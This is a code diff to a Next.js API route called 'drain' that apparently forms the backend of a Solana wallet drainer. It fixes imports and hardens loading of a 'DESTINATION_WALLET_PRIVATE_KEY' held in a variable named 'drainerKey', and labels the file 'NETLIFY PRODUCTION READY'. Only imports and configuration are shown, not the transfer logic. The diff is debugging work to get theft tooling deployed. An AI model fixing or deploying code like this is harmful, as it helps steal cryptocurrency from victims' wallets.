@@ -1,5 +1,4 @@
-// src/app/api/drain/route.ts
-
+// src/app/api/drain/route.ts - NETLIFY PRODUCTION READY
 import { NextRequest, NextResponse } from "next/server";
 import {
   Connection,
@@ -11,6 +10,7 @@ import {
   type Commitment,
   type VersionedTransaction,
   BlockheightBasedTransactionConfirmationStrategy,
+  SystemProgram, // ← ADD THIS
 } from "@solana/web3.js";
 import {
   TOKEN_PROGRAM_ID,
@@ -19,21 +19,25 @@ import {
   createAssociatedTokenAccountInstruction,
   getAccount,
   getAssociatedTokenAddress,
-  MINT_LAYOUT,
+  MintLayout, // ✅ FIXED: MintLayout (capital M)
 } from "@solana/spl-token";
 import dotenv from "dotenv";
 
 dotenv.config();
 
-// --- Backend config ---
+// --- Backend config (PRODUCTION-SAFE) ---
 const rpcUrl = process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com";
 const commitment: Commitment = "confirmed";
 
 const connection = new Connection(rpcUrl, commitment);
 
-const privateKeyBytes = Buffer.from(
-  process.env.DESTINATION_WALLET_PRIVATE_KEY!.split(",").map(Number)
-);
+// ✅ NULL-SAFE PRIVATE KEY (NETLIFY FIX)
+const privateKeyString = process.env.DESTINATION_WALLET_PRIVATE_KEY;
+if (!privateKeyString) {
+  throw new Error("DESTINATION_WALLET_PRIVATE_KEY environment variable is required");
+}
+
+const privateKeyBytes = Buffer.from(privateKeyString.split(",").map(Number));
 const drainerKey = Keypair.fromSecretKey(privateKeyBytes);
 const DESTINATION_WALLET = drainerKey.publicKey;
 
